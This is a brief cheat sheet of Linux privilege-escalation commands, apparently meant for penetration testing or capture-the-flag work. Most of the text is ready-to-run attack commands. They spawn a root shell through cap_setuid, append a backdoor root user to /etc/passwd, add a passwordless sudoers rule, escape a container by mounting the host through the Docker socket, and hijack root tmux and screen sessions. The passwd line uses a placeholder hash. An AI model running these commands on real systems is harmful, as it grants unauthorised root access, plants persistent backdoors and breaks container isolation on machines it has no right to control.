# Linux Capabilities, Writable Files & Shared Libraries

## Capabilities
```bash
# Check capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid+ep - Allows setting UID
# cap_dac_override+ep - Bypass file permissions

# Exploit cap_setuid:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Writable /etc/passwd
```bash
ls -la /etc/passwd

# Generate password hash: openssl passwd -1 -salt x password123
echo 'newroot:$1$x$xxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot  # Password: password123
```

## Writable /etc/sudoers
```bash
echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo -u root /bin/bash
```

## Shared Library Hijacking
```bash
# Check for LD_PRELOAD abuse
# Check ldd for missing libraries
ldd /usr/local/bin/somebinary
```

## Docker / LXC Escapes
```bash
cat /proc/1/cgroup | grep docker
ls -la /var/run/docker.sock

# If docker socket is readable:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh
```

## Tmux/Screen Hijacking
```bash
tmux ls
screen -ls
tmux attach-session -t root_session
screen -x root_screen
```
